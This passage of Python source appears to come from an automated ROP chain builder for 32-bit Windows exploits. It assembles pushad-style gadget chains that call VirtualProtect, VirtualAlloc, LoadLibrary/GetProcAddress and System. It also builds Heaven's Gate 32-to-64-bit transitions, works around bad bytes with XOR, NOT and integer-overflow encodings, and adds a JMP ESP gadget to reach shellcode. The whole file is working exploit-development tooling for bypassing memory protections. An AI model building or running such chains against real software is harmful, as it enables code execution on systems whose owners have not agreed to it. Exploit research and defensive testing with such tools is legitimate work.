		'2': {'r': 'eax', 'val': 'VAPtr', 'excluded':[],"r2":"",'com':''},
		'3': {'r': 'esi', 'val': 'JmpDword', 'excluded':[], "r2":"eax",'com':''},
		'4': {'r': 'ebp', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':' LpAddress - automatic skip '},
		'6': {'r': 'ebx', 'val': 'dwSize2', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'edx', 'val': 'flAllocationType', 'excluded':[], "r2":"",'com':''},
		'1': {'r': 'ecx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':' flNewProtect '}
		},
		'SYSxx':{ 
		'1': {'r': 'edi', 'val': 'x', 'excluded':[], "r2":'','com':''},
		'2': {'r': 'eax', 'val': 'x', 'excluded':[],"r2":"",'com':''},
		'3': {'r': 'esi', 'val': 'x', 'excluded':[], "r2":"",'com':''},
		'4': {'r': 'ebp', 'val': 'x', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'x', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'x', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'edx', 'val': 'x', 'excluded':[], "r2":"",'com':''},
		'8': {'r': 'ecx', 'val': 'x', 'excluded':[], "r2":"",'com':''}
        }
        }

def giveRegValsFromDict(dict,t,i):
	r=pat[i][str(t)]["r"]
	rV=pat[i][str(t)]["val"]
	rExclude=pat[i][str(t)]["excluded"]
	r2=pat[i][str(t)]["r2"]
	com="generic comment " + str(t)
	com=pat[i][str(t)]["com"]
	return r, rV,rExclude,r2,com

def addExRegs(excludeRegs, r):
	if r != "esp":
		excludeRegs.append(r)
	return excludeRegs

def buildPushadInner(bad,excludeRegs,winApi,apiNum,apiCode,pk1, completePKs,stopCode):
	j=0
	outputsTxt=[]
	outputsPk=[]
	outputsTxtC=[]

	for x in range(apiNum):
		i,j, apiCode, apiNum= giveApiNum(winApi,j)
		# print (gre+"i", i, "j", j, "apiCode",apiCode,"apiNum",apiNum,res)
		# apiCode="GPA1s"
		# print (i, j, "apiCode",apiCode, apiNum)
		print (yel,"    Attempting apiCode",res,apiCode, j)


		excludeRegs2= copy.deepcopy(excludeRegs)
		# i=apiCode+str(j)
		# curPat=i

		length1=True
		pk=[]

		foundL1, pl1, lr1,r1 = loadRegP(1,i, bad,True,excludeRegs2,pk)
		if foundL1:
			excludeRegs2=addExRegs(excludeRegs2, r1)
			# print (cya+"adding to excludeRegs2 1", excludeRegs2,res)
			pk=pkBuild([pk1,lr1])
		else:
			# print(red,"buildps continue 1",res)
			continue

		foundL2, pl2, lr2,r2 = loadRegP(2,i, bad,True,excludeRegs2,pk)
		if foundL2:
			excludeRegs2=addExRegs(excludeRegs2, r2)
			# print (cya+"adding to excludeRegs2 2", excludeRegs2,res)
			pk=pkBuild([pk,lr2])
		else:
			# print(red,"buildps continue 2",res)
			continue

		foundL3, pl3, lr3,r3 = loadRegP(3,i, bad,True,excludeRegs2,pk)
		if foundL3:
			excludeRegs2=addExRegs(excludeRegs2, r3)
			# print (cya+"adding to excludeRegs2 3", excludeRegs2,res)
			pk=pkBuild([pk,lr3])
		else:
			# print(red,"buildps continue 3",res)
			continue

		foundL4, pl4, lr4,r4 = loadRegP(4,i, bad,True,excludeRegs2,pk)
		if foundL4:
			excludeRegs2=addExRegs(excludeRegs2, r4)
			# print (cya+"adding to excludeRegs2 4", excludeRegs2,res)
			pk=pkBuild([pk,lr4])
		else:
			# print(red,"buildps continue 4",res)
			continue

		foundL5, pl5, lr5,r5 = loadRegP(5,i, bad,True,excludeRegs2,pk)
		if foundL5:
			excludeRegs2=addExRegs(excludeRegs2, r5)
			# print (cya+"adding to excludeRegs2 5", excludeRegs2,res)
			pk=pkBuild([pk,lr5])
		else:
			# print(red,"buildps continue 5",res)
			continue

		foundL6, pl6, lr6,r6 = loadRegP(6,i, bad,True,excludeRegs2,pk)
		if foundL6:
			excludeRegs2=addExRegs(excludeRegs2, r6)
			# print (cya+"adding to excludeRegs2 6", excludeRegs2,res)
			pk=pkBuild([pk,lr6])
		else:
			# print (red,"continue 6",res)
			continue

		foundL7, pl7, lr7,r7 = loadRegP(7,i, bad,True,excludeRegs2,pk)
		if foundL7:
			excludeRegs2=addExRegs(excludeRegs2, r7)
			# print (cya+"adding to excludeRegs2 7", excludeRegs2,res)
			pk=pkBuild([pk,lr7])
		else:
			# print (red,"continue 7",res)
			continue

		foundL8, pl8, lr8,r8 = loadRegP(8,i, bad,True,excludeRegs2,pk)
		
		if foundL8:
			excludeRegs2=addExRegs(excludeRegs2, r8)
			pk=pkBuild([pk,lr8])
		else:
			# print (red,"continue 8",res)
			continue

		fRet, pR,rDict=findRet(bad)
		foundPushad, puA,pDict=findPushad(bad,length1,excludeRegs)

		if foundPushad:
			pkPA=pkBuild([pk,puA])
			print (cya,"    Completed apiCode",res,apiCode, j)

		else:
			cOut,out= (genOutput(pk,winApi))
			print (cOut)
			print (red,"  Valid pushad not found - all else found - chain generation TERMINATED!!!",res)
			if puA!=0x99:
				print (red,"  A pushad with bad bytes does exist:",res)
				offset1=fg.rop[puA].offset + pe[n].VirtualAdd
				print(gre+"\t0x"+hx(img(puA)),res, "\toffset:",cya, hex(offset1), yel,disOffset(puA),res)
				print ("  Some patterns may allow this to be substituted for a ROP nop and done via Push/Ret -> Pushad.\n   e.g. integer overflow, XOR, etc.")
				
				# str(hx (img(t,myDict), 8))+ whi+", # " + yel+ disMini(myDict[t].g.raw, myDict[t].g.offset) 
			return False, [],[],[]
			### too unreliable to automate - will disrupt any other register
			# if puA==0x99:
			# 	continue
			# else:
			# 	success, tryPackage = tryObfMethods(excludeRegs,bad,img(puA),"", bb, False,reg,comment)

		if foundL1 and foundL2 and foundL3 and foundL4 and foundL5 and foundL6 and foundL7 and foundL8 and foundPushad:
			if i!="VP1" and i!="VA2":
				pkFinal=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8, pR])
				pkFinalPA=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8,puA])
				# showChain(pkFinal,True)
			else:
				jFound22, jESP,com2=pv.get_JmpESP("JmpESP",excludeRegs, esp,"", bad,[])
				if jFound22:
					chJ=chainObj(jESP, "Jmp to shellcode",[])
				else:
					fRet, rn,rDict=findRet(bad)
					chJ=chainObj(rn, "JMP ESP needed here to reach shellcode",[])

				pkFinal=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8, pR,chJ])
				pkFinalPA=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8,puA,chJ])


			pass
			if not stopCode in apiCode:
				return True,apiCode+str(j), pkFinal,pkFinalPA
			else:
				pkAll=pkBuild([completePKs,pkFinalPA])
		else:
			print (" No chains found.")
			return False,apiCode+str(j), [],[]
		# j+=1
		excludeRegs2.clear()
		# showChain(pkAll)	
		cOut,out= (genOutput(pkAll,winApi))
		outputsTxt.append(out)
		# print ("999", cOut)
		outputsTxtC.append(cOut)
		outputsPk.append(pkAll)
		dp(len(outputsTxt))

	if len(outputsTxtC)>0:
		for o in outputsTxtC:
			print(o)
		return True, outputsTxt,outputsTxtC, outputsPk
	else:
		print (" No chains found!")
		return False, [],[],[]

def giveApiNum(winApi,j):
	dp ("giveApiNum", winApi)
	global curPat
	j+=1
	# winApi="GetProcAddress"
	if winApi=="LoadLibrary":
		apiNum=9
		apiCode="LoLi"
	elif winApi=="GetProcAddress":
		apiNum=11
		apiCode="GPA"
	elif winApi=="System":
		apiNum=11
		apiCode="SYS"		
	elif winApi=="HG":
		apiNum=11
		apiCode="HG32"
	elif winApi=="VP":
		apiNum=2
		apiCode="VP"
	elif winApi=="VA":
		apiNum=2
		apiCode="VA"						
	i=apiCode+str(j)
	curPat=i
	return i,j, apiCode, apiNum

def buildPushad(bad, patType):
	excludeRegs=[]
	global opt
	bad=opt["badBytes"]

	global curPat
	global oldPat
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)
	length1=True
	espDesiredMovement=0
	regs=["eax","ebx","ecx","edx","edi","esi","ebp","esp"]
	excludeRegs2= copy.deepcopy(excludeRegs)
	outputs=[]
	pk=[]
	oldPat=""

	# patType="GetProcAddress"
	if patType=="GetProcAddress":
		stopCode="GPA"
		foundInner1, oldApiCode,pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
		if foundInner1:
			oldPat+=oldApiCode + " "
			foundInnerGPA,outputsTxtGPA, outputsTxtCGPA,outputsPkGPA=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
			if foundInnerGPA:
				fgc.addsrGetProcAddress(fChainObj(outputsPkGPA,outputsTxtGPA,outputsTxtCGPA))
				printGadgetChain(outputsTxtGPA, "sr_GetProcAddress")
	elif patType=="System":
		stopCode="SYS"
		foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
		if foundInner1:
			oldPat+=oldApiCode + " "
			foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
			if foundInner2:
				oldPat+=oldApiCode + " "
				pkTemp=pkBuild([pk1,pk2])
				pk=pkBuild([pkPA1,pkPA2])
				# foundInner3, oldApiCode,pk3,pkPA3=buildPushadInner(bad,excludeRegs2,"System",9,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
				foundInnerSys,outputsTxtSys,outputsTxtCSys, outputsPkSys=buildPushadInner(bad,excludeRegs2,"System",9,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
				if foundInnerSys:
					fgc.addsrSystem(fChainObj(outputsPkSys,outputsTxtSys,outputsTxtCSys))
					printGadgetChain(outputsTxtSys, "sr_System")

					# oldPat+=oldApiCode + " "
	elif patType=="HG32":
		stopCode="HG32"
		foundInnerHG,outputsTxtHG, outputsTxtCHG,outputsPkHG=buildPushadInner(bad,excludeRegs2,"HG",11,"apiCode",pk,pk,stopCode)
		if foundInnerHG:
			fgc.addHg32to64(fChainObj(outputsPkHG,outputsTxtHG,outputsTxtCHG))
			printGadgetChain(outputsTxtHG, "Heavens_Gate_32_to_64")
	elif patType=="VP":
		stopCode="VP"
		foundInnerVP,outputsTxtVP, outputsTxtCVP,outputsPkVP=buildPushadInner(bad,excludeRegs2,"VP",2,"apiCode",pk,pk,stopCode)
		if foundInnerVP:
			# fgc.addHg32to64(fChainObj(outputsPkHG,outputsTxtHG,outputsTxtCHG))
			#todo
			printGadgetChain(outputsTxtVP, "VirtualProtect")
	elif patType=="VA":
		stopCode="VA"
		foundInnerVP,outputsTxtVP, outputsTxtCVP,outputsPkVP=buildPushadInner(bad,excludeRegs2,"VA",2,"apiCode",pk,pk,stopCode)
		if foundInnerVP:
			# fgc.addHg32to64(fChainObj(outputsPkHG,outputsTxtHG,outputsTxtCHG))
			#todo
			printGadgetChain(outputsTxtVP, "VirtualAlloc")


def buildPushadOld(excludeRegs,bad, myArgs ,numArgs):
	global PWinApi
	global curPat
	IncDec="dec"
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)
	length1=True
	espDesiredMovement=0
	regs=["eax","ebx","ecx","edx","edi","esi","ebp","esp"]
	excludeRegs2= copy.deepcopy(excludeRegs)
	outputs=[]
	j=-1

	winApi="loadLibrary"
	winApi="System"

	i,j, apiCode, apiNum= giveApiNum(winApi,j)

	for x in range(apiNum):
		excludeRegs2= copy.deepcopy(excludeRegs)
	
		i,j, apiCode, apiNum= giveApiNum(winApi,j)

	
		if 1==44:
			pk=[]
			foundL1, pl1, lr1,r1 = loadRegP(1,i, bad,True,excludeRegs2,pk)
			if foundL1:
				excludeRegs2=addExRegs(excludeRegs2, r1)
				pk=pkBuild([lr1])
			else:
				continue

			foundL2, pl2, lr2,r2 = loadRegP(2,i, bad,True,excludeRegs2,pk)
			if foundL2:
				excludeRegs2=addExRegs(excludeRegs2, r2)
				pk=pkBuild([pk,lr2])
			else:
				continue

			foundL3, pl3, lr3,r3 = loadRegP(3,i, bad,True,excludeRegs2,pk)
			if foundL3:
				excludeRegs2=addExRegs(excludeRegs2, r3)
				pk=pkBuild([pk,lr3])
			else:
				continue

			foundL4, pl4, lr4,r4 = loadRegP(4,i, bad,True,excludeRegs2,pk)
			if foundL4:
				excludeRegs2=addExRegs(excludeRegs2, r4)
				pk=pkBuild([pk,lr4])
			else:
				continue

			foundL5, pl5, lr5,r5 = loadRegP(5,i, bad,True,excludeRegs2,pk)
			if foundL5:
				excludeRegs2=addExRegs(excludeRegs2, r5)
				pk=pkBuild([pk,lr5])
			else:
				continue

			foundL6, pl6, lr6,r6 = loadRegP(6,i, bad,True,excludeRegs2,pk)
			if foundL6:
				excludeRegs2=addExRegs(excludeRegs2, r6)
				pk=pkBuild([pk,lr6])
			else:
				continue

			foundL7, pl7, lr7,r7 = loadRegP(7,i, bad,True,excludeRegs2,pk)
			if foundL7:
				excludeRegs2=addExRegs(excludeRegs2, r7)
				pk=pkBuild([pk,lr7])
			else:
				continue

			foundL8, pl8, lr8,r8 = loadRegP(8,i, bad,True,excludeRegs2,pk)
			if foundL8:
				excludeRegs2=addExRegs(excludeRegs2, r8)
				pk=pkBuild([pk,lr8])
			else:
				continue

			foundPushad, puA,pDict=findPushad(bad,length1,excludeRegs)
			if foundPushad:
				pk=pkBuild([pk,puA])
				dp("have foundPushad")
			else:
				dp ("no pushad found")

		foundInner1, pk=buildPushadInner(bad,i,excludeRegs2,winApi,apiNum,apiCode)
		if foundInner1:
			foundInner2, pk=buildPushadInner(bad,i,excludeRegs2,winApi,apiNum,apiCode)
			if foundInner2:
				pass

		dp ("special chain buildPushad")
		showChain(pk)	
		cOut,out= (genOutput(pk,winApi))
		outputs.append(out)
		dp (len(outputs))

		j+=1
		excludeRegs2.clear()
		# return

	dp ("finalend", len(outputs))
	for o in outputs:
		dp (o)

def runEmGetRegAtCurLoc(pe,n,pk, distEsp, IncDec,numP, destAfter=True):
	# print(PWinApi,sysTarget, rValStr,distanceMode,patType)
	global finalPivotGadget


	distanceMode=False
	if not distanceMode:
		myGadgets=buildRopChainTemp(pk)
	else:
		myGadgets=buildRopChainTempMore(pk,rValStr,patType)
	sysTarget=0x02

	try:
		if sysTarget!=None:
			sysTarget=img(sysTarget)
		else:
			# print(hex(fg.rop[finalPivotGadget].offset), hex(pe[n].startLoc),n)
			finalPivotGadget=img(finalPivotGadget)
			# print ("finalPivotGadget", hex(finalPivotGadget))
	except Exception as e:
		dp ("oh no", sysTarget)
		dp(e)
		dp(traceback.format_exc())

	PWinApi=0x554433
	finalPivotGadget3=0x0

	# def rop_testerRunROP(pe,n,gadgets, distEsp,IncDec,numP,targetP2,targetR, PWinApi,sysTarget,finalPivotGadget1, rValStr=None):

	gOutput, locParam, locReg, winApiSyscallReached, givStDistance =rop_testerRunROP(pe,n,myGadgets,distEsp, IncDec,numP,"sysInvoke",None,PWinApi,sysTarget,finalPivotGadget3)
	pkTxt=showChain(pk,False,True)
	outFile.write("The above is to ascertain a value at a register. It pertains to the below:\n  " +pkTxt+"\n\n")
	
	# gOutput.show()
	return gOutput


def getDistanceParamReg(pe,n,pk, distEsp, IncDec,numP,targetP,targetR, destAfter,PWinApi=0,sysTarget=None, rValStr=None,distanceMode=False,patType=None):
	# print(PWinApi,sysTarget, rValStr,distanceMode,patType)
	global finalPivotGadget

	dp (cya,"getDistanceParamReg targetP",targetP, "numP", numP,"patType" ,patType,res)
	if not distanceMode:
		myGadgets=buildRopChainTemp(pk)
	else:
		myGadgets=buildRopChainTempMore(pk,rValStr,patType)

	try:
		if sysTarget!=None:
			sysTarget=img(sysTarget)
		else:
			# print(hex(fg.rop[finalPivotGadget].offset), hex(pe[n].startLoc),n)
			finalPivotGadget=img(finalPivotGadget)
			# print ("finalPivotGadget", hex(finalPivotGadget))
	except Exception as e:
		dp ("oh no", sysTarget)
		dp(e)
		dp(traceback.format_exc())

	gOutput, locParam, locReg, winApiSyscallReached, givStDistance =rop_testerRunROP(pe,n,myGadgets,distEsp, IncDec,numP,targetP,targetR,PWinApi,sysTarget,finalPivotGadget, rValStr)
	pkTxt=showChain(pk,False,True)
	outFile.write("The above pertains to the below:\n  " +pkTxt+"\n\n")
	
	dp ("destAfter",destAfter)
	if destAfter:   # Target Param AFTER current memory location (e.g. mov dword [ebx], eax    -->  target destination AFTER ebx)

		diffPR=locParam-locReg
	else:  # Target Param BEFORE current memory location (e.g. mov dword [ebx], eax    -->  target destination BEFORE ebx)
		diffPR=locReg-locParam

		#to do???????

	dp(yel)
	dp ("diffPR 1", hex(diffPR))
	
	##Maybe delete this part with new addition? redundant
	diffPR=  int2hex(diffPR,32)
	dp ("diffPR 2", hex(diffPR))
	dp ("Diff totals:",hex(locParam),"-",hex(locReg), "=", hex(diffPR))
	dp (res)
	if diffPR==0 and winApiSyscallReached==False:
		dp (gre,"We have not reached the WinApi/Syscall. Decrementing by 4.")
		diffPR=  int2hex(diffPR-4,32)
		dp ("New diffPR: ", hex(diffPR),res)
	dp ("diffPR", hex(diffPR))
	intGivStDistance= int2hex(givStDistance,32)
	dp ("givStDistance",  hex(givStDistance), hex(intGivStDistance ))
	if intGivStDistance!=0xdeadc0de:
		diffPR=intGivStDistance
		# print ("\t",cya, "switch made",res, hex(diffPR))
	return diffPR, winApiSyscallReached


def pkBuild(myList):
	# dp ("pkBuild", myList)
	nl=[]
	nl2=[]
	for each in myList:
		if type(each)==list:
			new=[]
			for y in each:
				if y==None:
					# dp ("pass")
					pass
				elif type(y)==list:
					new2=[]
					for d in y:
						if d==None:
							pass
						else:
							new2.append(d)
					new.extend(new2)
				else:
					new.append(y)
			nl.extend(new)
		elif type(each)==int:
			new=chainObj(each,"", [])
			nl.append(new)
		else:
			if each == None:
				# dp ("skip appending", type(each))
				pass
			else:
				nl.append(each)
	# notDone=False
	# if notDone:
	# 	nl2=pkBuild([nl])
	# 	notDone=True
	# 	nl=nl2
	return nl


def buildHGDouble2(hgExcludeRegs,excludeRegs,bad,destination):
	#####This whole function is deprecated and not used, including some functions below it.
	dp ("buildHGDouble2")
	first=""
	second=""
	hgKey=0
	p=0
	d1=0
	d2=0
	p1=0
	p2=0
	p3=0
	pu1=0
	rf=0
	pushOut=0
	popOut=0
	pop="pop"
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	hgFound=False
	for reg in excludeRegs:
		availableRegs.remove(reg)
	package=[]
	foundRetf, rf, rdict = getRetf(bad)
	if not foundRetf:
		rf=0xbaddffff
	foundPR, p3, pu1 = findPushRetCompact(excludeRegs, bad, availableRegs, False)

	# foundPR=False  # artificially make condition false for testing purposes
	dp("# artificially make condition false for testing purposes")

	if foundPR:
		tTrf=tryThisFunc(rf)
		rP3=chainObj(p3, "Loading the final push/ret with retf " + tTrf, [img(rf)])
		rPR=chainObj(pu1, "Final push/ret to lead to retf", [])
		rPR=[rP3,rPR]
		# showChain(rPR)

	else:
		foundPR, rPR = remakeWithObf(findPushRetCompact, 2,excludeRegs, bad, availableRegs, False)
		if foundPR:
			rPR[-1].appCom("Final push/ret to lead to retf")
	if foundRetf and foundPR:
		pass
		foundPops, rHGP=getHGandPops(hgExcludeRegs,excludeRegs,bad,availableRegs, pu1,destination)
	if foundRetf and foundPR and foundPops:
		package.extend(rHGP)
		package.extend(rPR)
		showChain(package)
		cOut,out=genOutput(package)

def remakeD(func,num,*myArgs): # dumb testing func - not used
	if len(myArgs)>2:
		# dp ("type", type(myArgs))
		dp("remake",myArgs, *myArgs)
		first, second, *rest = myArgs
		second ="haha"
		myArgs=(first,second, *rest)
		dp ("len", len(myArgs))
	# dp("type", type(*myArgs))
	# dp ("myArgs", myArgs)
	# dp ("myArgs", *myArgs)

	out=func(*myArgs)
	return out

def availRegs(regFirst,excludeRegs):
	print ("availRegs",regFirst,excludeRegs)
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)
	availableRegs =regListToFront((availableRegs, reg))
	print ("availableRegs",availableRegs)
	return availableRegs

def tryObfMethods(excludeRegs,bad,goal,tThis, bb, withPR=True,reg=None, comment="",isVal=False):
	dp ("inside tryObfMethods")
	# print (blu+"tryObfMethods", hex(goal), "excludeRegs",excludeRegs,res)

	intSuccess, package =buildIntOverflowPR(excludeRegs,bad,goal,tThis,bb,withPR,reg,comment,isVal)
	if intSuccess:
		return True, package
	return False, []

	foundInt2,package = buildFoundIntOv(goal,excludeRegs,bad,withPR,reg, comment,isVal)
	if foundInt2:
		# print ("buildFoundIntOv true")
		return True, package

	# negSucess, package=buildNeg(goal,excludeRegs, bad,withPR,reg,isVal)
	# if negSucess:
	# 	return True, package
	notSucess, package=buildNot(goal,excludeRegs, bad,withPR,reg,comment,isVal)
	if notSucess:
		return True, package

	xorSuccess,package=buildXor(goal,excludeRegs,bad,bb,withPR,reg,comment,isVal)
	if xorSuccess:
		return True, package
	return False,[]

	foundXorSuccess,package=buildFoundXor(goal,excludeRegs,bad,bb, True,withPR, reg,comment,isVal)
	if foundXorSuccess:
		return True, package
	

	return False, []
			
def remakeWithObf(func,numReturns,*myArgs):
	t=0
	foundOnce=False
	for each in myArgs:
		dp (t, "type", type(each))
		if type(each)==bytes:
			# dp ("got it",t)
			num=t
				# break
		t+=1

	bad = myArgs[num]
	dp ("remakeWithObf bad num", num, "numReturns", numReturns)
	dp ("func", func)
	if len(myArgs)>2:
		if num == 3:   # it is always plus 3 since 3 parameters in front of my Args
			first, second, target, *rest = myArgs
			target =b''
			myArgs=(first,second,  target,*rest)
		elif num == 4:   # it is always plus 4 since 4 parameters in front of my Args
			first, second, third, target, *rest = myArgs
			target =b''
			myArgs=(first,second,third, target,*rest)
		elif num == 5:   # it is always plus 5 since 5 parameters in front of my Args
			first, second, third, forth, target, *rest = myArgs
			target =b''
			myArgs=(first,second,third, forth,  target,*rest)
		elif num == 6:
			first, second, third, forth, fifth, target,*rest = myArgs
			target =b''
			myArgs=(first,second, third,forth, fifth,  *rest)
		elif num == 7:
			first, second, third,forth, fifth, sixth, target,*rest = myArgs
			target =b''
			myArgs=(first,second, third,forth, fifth, sixth, target,*rest)
	orgOutput=func(*myArgs)
	# dp ("outs", hex(orgOutput[1]), hex(orgOutput[2]))
	existNoBadBytes= orgOutput[0]
	package=[]
	success=False
	if existNoBadBytes:
		tThis=""
		dp ("existNoBadBytes orgOutput", orgOutput)
		goal= orgOutput[1]
		success, package = tryObfMethods(popExcludeRegs,bad,goal,tThis, bb)
		if not success or (success and numReturns==1):
			return success, package
		goal2= orgOutput[2]
		success, package2 = tryObfMethods(popExcludeRegs,bad,goal2,tThis, bb)
		package.extend(package2)
		if not success or (success and numReturns==2):
			return success, package
		goal3= orgOutput[3]
		success, package3 = tryObfMethods(popExcludeRegs,bad,goal3,tThis, bb)
		package.extend(package3)
		if not success or (success and numReturns==3):
			return success, package
		goal4= orgOutput[4]
		success, package4 = tryObfMethods(popExcludeRegs,bad,goal4,tThis, bb)
		package.extend(package4)
		if not success or (success and numReturns==4):
			return success, package
		goal5= orgOutput[5]
		success, package5 = tryObfMethods(popExcludeRegs,bad,goal5,tThis, bb)
		package.extend(package5)
		if not success or (success and numReturns==5):
			return success, package
	return success, package

def getRetf(bad):
	bExistsR,retfOut=fg.getFg("retfSingle")
	if bExistsR:
		dp ("bExistsR")
		for r in retfOut:
			dp ("r",hex(r))
			freeBad=checkFreeBadBytes(opt,fg,r,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if freeBad:
				rf=r
				return True, r, retfOut
			else:
				return False,1,1,
	else:
		# dp ("no bExistsR")
		return False, 1,2


def buildHGDouble(hgExcludeRegs,excludeRegs):

	first=""
	second=""
	hgKey=0
	d1=0
	d2=0
	p1=0
	p2=0
	p3=0
	pu1=0
	rf=0
	pushOut=0
	popOut=0
	pop="pop"
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		availableRegs.remove(reg)

	###IDEAL 
	bad=b"\x93"
	# bad=""
	hgOuts={}
	skipOtherSearches=False
	dp ("num fg.hgGadgets", len(fg.hgGadgets))
	for p in fg.hgGadgets:
		freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		if fg.hgGadgets[p].hgDiff==0 and freeBad:
			first=fg.hgGadgets[p].hg1
			second=fg.hgGadgets[p].hg2
			hgKey=p
			dp ("\thgkey",disMini(fg.hgGadgets[p].raw, fg.hgGadgets[p].offset))

			bExists, d1, d2=fg.get2FG(pop+first.upper(),pop+second.upper())
			if bExists:
				dp ("got one", first, second, hex(p))
				popExists,p1=findPopLength1(d1,bad)
				popExists2,p2=findPopLength1(d2,bad)

				if popExists:
					dp("\tpop exists", first, hex(p1))
					dp ("\t",disMini(d1[p1].raw, d1[p1].offset))
				else:
					dp ("\tit ain't there. but here is one.")
				if popExists2:
					dp("\tpop exists", first, hex(p2))
					dp ("\t",disMini(d2[p2].raw, d2[p2].offset))
				else:
					dp ("\tit ain't there. but here is one.")
				if popExists and popExists2:
					skipOtherSearches=True

					# addChain(gadget, comment, stack,index, myDict)
					# addChain(d1[p1], "first pop", [0x33], hgOuts,0)

					# addChain(d2[p2], "second pop", [p], hgOuts,1)
					# addChain(fg.hgGadgets[p], "Double push heaven's gate gadget #1", [], hgOuts,2)
					# addChain(d1[p1], "first pop", [0x9999], hgOuts,3)

					# addChain(d2[p2], "second pop", [p], hgOuts,4)
					# addChain(fg.hgGadgets[p], "Double push heaven's gate gadget #2", [], hgOuts,5)

					break ## we have them - can stop

					# need a pop analyzer for diff=0
	# searching for ones that are slightly imperfect - some clobbering

	# otherRegsToExclude=[]

	
	dp ("other checks!!!")
	
	espDesiredMovement=4
	skipOtherSearches=False
	if not skipOtherSearches:
		for p in fg.hgGadgets:
			if fg.hgGadgets[p].hgDiff!=0:
				hgKey=p

				first=fg.hgGadgets[p].hg1
				second=fg.hgGadgets[p].hg2
				dp ("\thgkey2",disMini(fg.hgGadgets[p].raw, fg.hgGadgets[p].offset))
				bExists, d1, d2=fg.get2FG(pop+first.upper(),pop+second.upper())
				if bExists:
					dp ("got one3")
					popExists, p1,d1,rObj = rop_testerFindClobberFree(d1, excludeRegs,bad,"c3",espDesiredMovement,[first])
					popExists2, p2,d2, rObj = rop_testerFindClobberFree(d2, excludeRegs,bad,"c3",espDesiredMovement,[second])
					if popExists and popExists2:
						skipOtherSearches=True
						

						dp("\tpop exists ALTERNATE", first, hex(p1), second, hex(p2))
						dp ("\thgkey",disMini(fg.hgGadgets[p].raw, fg.hgGadgets[p].offset))
						dp ("first and second", first, second)
						dp ("espdiff", d1[p1].regs.diffEsp, d2[p2].regs.diffEsp)
						dp ("espdiff2", fg.popECX[p1].regs.diffEsp, fg.popEDX[p2].regs.diffEsp)


						dp ("\t",disMini(d1[p1].raw, d1[p1].offset))
						dp ("\t",disMini(d2[p2].raw, d2[p2].offset))

						break
					else:
						dp ("not there.")
				### analyze and make sure none of other regs we care about are affected\

	foundPuPop3=False
	for reg in availableRegs:
		bExists,pushOut=fg.getFg("push",reg)
		bExistsPop,popOut=fg.getFg("pop",reg)

		if bExists and bExistsPop:
			pushExists,pu1=findPushLength1(pushOut,bad)
			popExists,p3=findPopLength1(popOut,bad)
			if pushExists and popExists:
				dp ("it has one2", reg)
				foundPuPop3=True
				# dp ("p3", p3)
				# addChain(d2[p2], "second pop", [p3], hgOuts,4 )
				break		

	foundPuPop3=False
	if not foundPuPop3:
		for reg in availableRegs:
			pushFlag=False
			popFlag=False
			bExists,pushOut=fg.getFg("push",reg)
			bExistsPop,popOut=fg.getFg("pop",reg)

			if bExists:
				pushExists,pu1=findPushLength1(pushOut,bad)
				pushExists=False   # artificially inducing false for testing
				if pushExists:
					pushFlag=True
				else:
					dp ("rc special")
					pushExists1, pu1,pushOut, rObj = rop_testerFindClobberFree(pushOut, excludeRegs,bad,"c3",-4)
					if pushExists1:
						dp ("pushExists true2")
						pushFlag=True
			if bExistsPop:
				popExists1,p3=findPopLength1(popOut,bad)
				popExists1 = False  # artificially inducing false for testing
				if popExists1:
				 	popFlag=True
				else:
					popExists1, p3,popOut, rObj = rop_testerFindClobberFree(popOut, excludeRegs,bad,"c3",4,[reg])
					if popExists1:
						dp ("popExists true2")
						popFlag=True
					dp ("not there")
					pass
			if pushFlag and popFlag:
				dp ("got both haha", reg, hex(p3))

				break



	bExistsR,retfOut=fg.getFg("retfSingle")
	if bExistsR:
		dp ("bExistsR")
		for r in retfOut:
			dp ("r",hex(r))
			freeBad=checkFreeBadBytes(opt,fg,r,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if freeBad:
				rf=r
				break
	else:
		dp ("no bExistsR")
	####### redo the above but with emulation checking - second choice

	#### imperfect - not checking espAdjusts - if things need to be added
	
	dp("type(d1)", type(d1))
	addChain(d1[p1], "first pop", [0x33], hgOuts,0)

	addChain(d2[p2], "second pop", [p], hgOuts,1)
	addChain(fg.hgGadgets[p], "Double push heaven's gate gadget #1", [], hgOuts,2)
	addChain(d1[p1], "first pop - the final destination ", [0xdeadc0de], hgOuts,3)

	addChain(d2[p2], "second pop - going to a single push gadget ", [pu1], hgOuts,4)
	addChain(fg.hgGadgets[p], "Double push heaven's gate gadget #2", [], hgOuts,5)

	addChain(popOut[p3], "Loading the final push/ret with retf ", [rf], hgOuts,6)
